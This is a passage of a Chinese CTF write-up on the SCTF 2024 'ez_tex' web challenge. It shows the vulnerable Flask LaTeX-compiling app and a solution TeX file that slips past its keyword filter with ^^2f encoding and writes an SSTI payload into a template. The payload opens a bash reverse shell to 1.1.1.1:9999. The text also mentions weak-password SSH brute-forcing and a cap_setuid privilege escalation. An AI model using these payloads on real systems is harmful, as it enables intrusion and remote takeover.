         subprocess.check_call([<span class="hljs-string">&#x27;pdflatex&#x27;</span>, file_path]) <br>                <span class="hljs-keyword">return</span> output_filename <br>        <span class="hljs-keyword">except</span> subprocess.CalledProcessError <span class="hljs-keyword">as</span> e: <br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(e) <br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(): <br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>) <br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>(): <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files: <br>                <span class="hljs-keyword">return</span> redirect(request.url) <br>        file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>] <br>        <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>: <br>                <span class="hljs-keyword">return</span> redirect(request.url) <br><br>        <span class="hljs-keyword">if</span> file <span class="hljs-keyword">and</span> allowed_file(file.filename): <br>                content = file.read() <br>                <span class="hljs-keyword">try</span>: <br>                        content_str = content.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>) <br>                <span class="hljs-keyword">except</span> UnicodeDecodeError: <br>                        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File content is not decodable&#x27;</span> <br>                <span class="hljs-keyword">for</span> bad_char <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;\\x&#x27;</span>, <span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;include&#x27;</span>, <span class="hljs-string">&#x27;write18&#x27;</span>, <span class="hljs-string">&#x27;immediate&#x27;</span>,<span class="hljs-string">&#x27;app&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>]: <br>                        <span class="hljs-keyword">if</span> bad_char <span class="hljs-keyword">in</span> content_str: <br>                                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File content is not safe&#x27;</span> <br>                file.seek(<span class="hljs-number">0</span>) <br>                filename = secure_filename(file.filename) <br>                file_path = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename) <br>                file.save(file_path) <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File uploaded successfully, And you can compile the tex file&#x27;</span> <br>        <span class="hljs-keyword">else</span>: <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file type or name&#x27;</span> <br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/compile&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compile</span>(): <br>        filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>) <br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> filename: <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No filename provided&#x27;</span>, <span class="hljs-number">400</span> <br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(filename) &gt;= <span class="hljs-number">7</span>: <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file name length&#x27;</span>, <span class="hljs-number">400</span> <br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> filename.endswith(<span class="hljs-string">&#x27;.tex&#x27;</span>): <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file type&#x27;</span>, <span class="hljs-number">400</span> <br><br>        file_path = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename) <br>        <span class="hljs-built_in">print</span>(file_path) <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(file_path): <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File not found&#x27;</span>, <span class="hljs-number">404</span> <br><br>        output_pdf = compile_tex(file_path) <br>        <span class="hljs-keyword">if</span> output_pdf.endswith(<span class="hljs-string">&#x27;.pdf&#x27;</span>): <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Compilation succeeded&quot;</span> <br>        <span class="hljs-keyword">else</span>: <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Compilation failed&#x27;</span>, <span class="hljs-number">500</span> <br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/log&#x27;</span></span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">log</span>(): <br>        <span class="hljs-keyword">try</span>: <br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;app.log&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> log_file: <br>                log_contents = log_file.read() <br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;log.html&#x27;</span>, log_contents=log_contents) <br>        <span class="hljs-keyword">except</span> FileNotFoundError: <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Log file not found&#x27;</span>, <span class="hljs-number">404</span> <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>: <br>app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">3000</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure>
+
+<p>直接ssti就出了。但是要重开靶机在第一次访问&#x2F;log之前写：</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-keyword">\documentclass</span>[]&#123;article&#125;<br><span class="hljs-keyword">\begin</span>&#123;document&#125;<br><span class="hljs-keyword">\newwrite</span><span class="hljs-keyword">\t</span><br><span class="hljs-keyword">\openout</span><span class="hljs-keyword">\t</span>=templates^^2flog.html<br><span class="hljs-keyword">\write</span><span class="hljs-keyword">\t</span>&#123;&#123;&#123;lipsum.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>globals<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>[&#x27;os&#x27;].popen(&#x27;bash -c &quot;^^2fbin^^2fsh -i &gt;<span class="hljs-built_in">&amp;</span> ^^2fdev^^2ftcp^^2f1.1.1.1^^2f9999 0&gt;<span class="hljs-built_in">&amp;</span>1&quot;&#x27;).read()&#125;&#125;&#125;<br><span class="hljs-keyword">\closeout</span><span class="hljs-keyword">\t</span><br><span class="hljs-keyword">\newpage</span><br>foo<br><span class="hljs-keyword">\end</span>&#123;document&#125;<br></code></pre></td></tr></table></figure>
+
+<p>反弹shell进去后没权限，它还给了个ssh，预期解是通过&#x2F;flag得知jerrywww用户名，然后爆破出弱密码P@ssw0rd，难绷。</p>
+<p>W&amp;M打了个非预期：&#x2F;usr&#x2F;bin&#x2F;python3.11 cap_setuid&#x3D;ep</p>
+<p><img src="/2024/10/05/sctf-web-learning/image-20241006000438952.png" srcset="/img/loading.gif" lazyload alt="image-20241006000438952"></p>
+<p>牛子。</p>
+<h2 id="havefun"><a href="#havefun" class="headerlink" title="havefun"></a>havefun</h2><p>ruby反序列化都来了我草。后面研究研究。</p>
+<p>（未完待续…）</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/82/#ez_tex">SCTF 2024 By W&amp;M - W&amp;M Team (wm-team.cn)</a></p>
+<p>[SCTF2024 Web&amp;Misc 复现 | 0pium’s Blog (hack3r0pium.github.io)](<a target="_blank" rel="noopener" href="https://hack3r0pium.github.io/hack3r0pium/2024/09/21/SCTF2024-Web&Misc-%E5%A4%8D%E7%8E%B0/index.html#:~:text=Web">https://hack3r0pium.github.io/hack3r0pium/2024/09/21/SCTF2024-Web&amp;Misc-复现/index.html#:~:text=Web</a> ezju)</p>
+<p><a target="_blank" rel="noopener" href="https://blog.xmcve.com/2024/10/01/SCTF-2024-Writeup/#title-20">SCTF 2024 Writeup - 星盟安全团队 (xmcve.com)</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%AF%94%E8%B5%9B/" class="print-no-link">#比赛</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>sctf-web-learning</div>
+      <div>https://eddiemurphy89.github.io/2024/10/05/sctf-web-learning/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>EddieMurphy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年10月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/09/27/Java-Dynamic-Proxy/" title="Java Dynamic Proxy">
+                        <span class="hidden-mobile">Java Dynamic Proxy</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="waline"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#waline', function() {
+      Fluid.utils.createCssLink('https://registry.npmmirror.com/@waline/client/2.15.8/files/dist/waline.css')
+      Fluid.utils.createScript('https://registry.npmmirror.com/@waline/client/2.15.8/files/dist/waline.js', function() {
+        var options = Object.assign(
+          {"serverURL":"https://waline-test-89-frzkoc8l2-eddiemurphy89s-projects.vercel.app/","path":"window.location.pathname","meta":["nick","mail","link"],"requiredMeta":["nick"],"lang":"zh-CN","emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis/weibo"],"dark":"html[data-user-color-scheme=\"dark\"]","wordLimit":0,"pageSize":10},
+          {
+            el: '#waline',
+            path: window.location.pathname
+          }
+        )
+        Waline.init(options);
+        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
+          var imgSelector = '#waline .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
